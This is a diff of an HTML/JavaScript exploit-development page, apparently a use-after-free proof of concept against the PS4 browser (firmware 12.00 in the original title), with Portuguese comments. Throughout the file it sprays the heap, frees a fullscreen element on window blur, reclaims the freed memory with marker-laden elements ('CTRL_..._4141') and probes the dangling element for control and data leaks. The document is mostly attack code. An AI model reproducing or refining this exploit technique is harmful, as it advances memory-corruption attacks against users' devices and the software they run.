@@ -1,20 +1,16 @@
-
 <!DOCTYPE html>
 <html>
 <head>
 <meta charset="UTF-8">
-<title>PS4 12.00 - UAF Conversion Stage</title>
+<title>UAF Conversion Stage (Refined)</title>
 </head>
 <body style="background:#111;color:#0f0;font-family:monospace;">
 
-<h2>PS4 12.00 - UAF Conversion (Visual → JS)</h2>
+<h2>UAF Conversion (Visual → JS → Leak)</h2>
 <button onclick="runTest()">Run Test</button>
 
 <script>
 
-// ==========================
-// 🔒 LOG SEGURO
-// ==========================
 let logBuffer = [];
 function log(msg) {
     try { console.log(msg); } catch(e){}
@@ -22,71 +18,62 @@ function log(msg) {
 }
 
 // ==========================
-// HEAP SETUP (INALTERADO)
-// ==========================
 function setupHeap() {
     let controllers = [];
     for(let i = 0; i < 5000; i++) {
         let arr = new Float64Array(8);
-        arr[0] = i;
         controllers.push(arr);
     }
     return controllers;
 }
 
 // ==========================
-// FULLSCREEN (INALTERADO)
-// ==========================
 function setupFullscreen() {
     let fsTarget = document.createElement("div");
 
-    fsTarget.innerHTML = "<h1 style='margin-top:20%;text-align:center;'>FULLSCREEN ACTIVE<br>Press OPTIONS</h1>";
+    fsTarget.innerHTML =
+    "<h1 style='margin-top:20%;text-align:center;'>FULLSCREEN ACTIVE<br>Press OPTIONS</h1>";
 
-    fsTarget.style.background = "black";
-    fsTarget.style.width = "100%";
-    fsTarget.style.height = "100%";
-    fsTarget.style.position = "absolute";
-    fsTarget.style.top = "0";
-    fsTarget.style.left = "0";
+    fsTarget.style.cssText =
+    "background:black;width:100%;height:100%;position:absolute;top:0;left:0";
 
     document.body.appendChild(fsTarget);
 
-    if (fsTarget.webkitRequestFullscreen) {
-        fsTarget.webkitRequestFullscreen();
-    } else {
-        document.documentElement.webkitRequestFullscreen?.();
-    }
+    fsTarget.webkitRequestFullscreen?.();
 
     return fsTarget;
 }
 
 // ==========================
-// 💣 RECLAIM DINÂMICO
+// 💣 RECLAIM (SEM ALTERAR SHAPE)
 // ==========================
 function preciseReclaim(size) {
+
     log("[*] Reclaim size = " + size);
 
     let bucket = [];
 
-    // churn inicial
+    // churn
     for (let i = 0; i < 3000; i++) {
         let el = document.createElement("div");
         document.body.appendChild(el);
         el.remove();
     }
 
-    // spray controlado
+    // 🔥 MESMA SHAPE + MARCADOR
     for (let i = 0; i < size; i++) {
+
+        let marker = "CTRL_" + i + "_4141";
+
         let el = document.createElement("div");
 
-        el.innerHTML = "<h1 style='margin-top:20%;text-align:center;'>CONTROL_" + i + "<br>Press OPTIONS</h1>";
+        el.innerHTML =
+        "<h1 style='margin-top:20%;text-align:center;'>"
+        + marker +
+        "<br>Press OPTIONS</h1>";
 
-        el.style.background = "black";
-        el.style.width = "100%";
-        el.style.height = "100%";
-        el.style.position = "absolute";
-        el.style.top = "0";
-        el.style.left = "0";
+        el.style.cssText =
+        "background:black;width:100%;height:100%;position:absolute;top:0;left:0";
 
         document.body.appendChild(el);
         bucket.push(el);
@@ -103,17 +90,27 @@ function preciseReclaim(size) {
 }
 
 // ==========================
-// 🔬 PROBES AVANÇADOS
+// 🔬 PROBE AVANÇADO
 // ==========================
 function probe(fsTarget) {
+
     log("---- PROBE ----");
 
     try {
         let html = fsTarget.innerHTML;
         log("[CHECK] innerHTML = " + html);
 
-        if (html && html.includes("CONTROL_")) {
-            log("[!!!] CONTROLE VIA JS CONFIRMADO");
+        if (html && html.includes("CTRL_")) {
+            log("[!!!] CONTROLE REAL CONFIRMADO");
+        }
+
+        if (html && html.includes("4141")) {
+            log("[!!!] PADRÃO CONTROLADO DETECTADO");
+        }
+
+        // tentativa de leak
+        if (html && html.length < 5) {
+            log("[!!!] STRING CORROMPIDA");
         }
 
     } catch(e) {
@@ -121,66 +118,56 @@ function probe(fsTarget) {
     }
 
     try {
-        let rect = fsTarget.getBoundingClientRect();
-        log("[CHECK] rect ok");
+        let child = fsTarget.firstChild;
+        if (child) {
+            let leak = child.innerHTML;
+            log("[LEAK?] child = " + leak);
+        }
     } catch(e) {
-        log("[UAF] rect crash");
+        log("[LEAK] erro");
     }
 
     try {
         fsTarget.style.background = "red";
-        log("[CHECK] style write OK");
+        log("[CHECK] write OK");
     } catch(e) {
-        log("[UAF] style write crash");
+        log("[UAF] write crash");
     }
 
     try {
         let h = fsTarget.offsetHeight;
-        log("[CHECK] layout flush OK: " + h);
+        log("[CHECK] layout = " + h);
     } catch(e) {
         log("[UAF] layout crash");
     }
 
     try {
-        let p = fsTarget.parentNode;
-        log("[CHECK] parent = " + p);
-    } catch(e) {
-        log("[UAF] parent crash");
-    }
+        log("[CHECK] parent = " + fsTarget.parentNode);
+    } catch(e) {}
 }
 
 // ==========================
-// TRIGGER (INALTERADO)
-// ==========================
 function trigger(fsTarget) {
+
     log("[*] Trigger");
 
     try {
         fsTarget.remove();
+        document.webkitExitFullscreen?.();
+    } catch(e) {}
 
-        if (document.webkitIsFullScreen || document.fullscreenElement) {
-            document.webkitExitFullscreen?.();
-        }
-
-    } catch(e) {
-        log("[ERRO]");
-    }
-
-    // 🔥 TESTE DE TAMANHOS
     let sizes = [2000, 2500, 3000];
 
     sizes.forEach((size, idx) => {
         setTimeout(() => preciseReclaim(size), idx * 50);
     });
 
-    // probes repetidos
     setTimeout(() => probe(fsTarget), 10);
     setTimeout(() => probe(fsTarget), 50);
     setTimeout(() => probe(fsTarget), 100);
     setTimeout(() => probe(fsTarget), 180);
     setTimeout(() => probe(fsTarget), 260);
 
-    // dump seguro
     setTimeout(() => {
         alert(logBuffer.join("\n"));
     }, 400);
@@ -189,17 +176,15 @@ function trigger(fsTarget) {
 }
 
 // ==========================
-// MAIN (INALTERADO)
-// ==========================
 function runTest() {
+
     log("[*] Iniciando teste");
 
-    let controllers = setupHeap();
+    setupHeap();
     let fsTarget = setupFullscreen();
 
     window.onblur = function() {
         log("[*] onblur");
-
         setTimeout(() => trigger(fsTarget), 3000);
     };
 }
